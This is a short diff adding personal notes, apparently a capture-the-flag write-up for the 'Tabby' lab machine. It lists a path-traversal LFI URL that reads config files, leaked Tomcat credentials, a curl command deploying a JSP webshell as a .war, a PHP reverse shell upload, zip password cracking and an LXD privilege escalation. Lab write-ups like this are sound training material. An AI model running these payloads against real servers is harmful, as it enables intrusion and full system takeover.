@@ -1,0 +1,19 @@
+- ran nmap got 80 apache http 8080 tomcat 22 ssh and some 1057 startron
+- the website redirected to megahosting.htb so added that to hosts and started recon
+- found a statement page where could induce lfi http://megahosting.htb/news.php?file=../../../../../../../etc/mysql/my.cnf
+- the 8080 page had default tomcat stuff with its default config paths
+- could access (with help) http://megahosting.htb/news.php?file=../../../../../../../../../var/lib/tomcat9/conf/server.xml and got the tomcat user and pass tomcat:$3cureP4s5w0rd123!
+- could deploy custom apps through cli using  curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file /media/sf_stuff/ctf/tabby/cmdjsp.war 'http://megahosting.htb:8080/manager/text/deploy?path=/
+cmdjsp&update=true'
+- had to upload jsp (java server page) backdoor wrapped in .war (basically a zip with renamed extension) because tomcat can unzip that.
+- so took the stock parrot jsp webshell and wrapped it in war and thats the one i send (zip -r cmdjsp.zip /usr/share/webshells/jsp/cmdjsp.jsp && mv cmdjsp.zip cmdjsp.war)
+- so could now access the webshell in http://tabby.htb:8080/cmdjsp/cmdjsp.jsp 
+- uploaded a php reverse shell using curl and got foothold
+- found a password protected zip in /var/www/html and took to here to do stuf
+- used fcrackzip -D -p rockyou zipname to crack pass which was admin@it
+- nothing much in the zip tho
+- could su as ash using that pass
+- found a lxd config file in home folder 
+- googled and found a privesc method using lxd which is kinda like docker
+- https://www.hackingarticles.in/lxd-privilege-escalation/ thats the one
+- ROOTED EZPZ
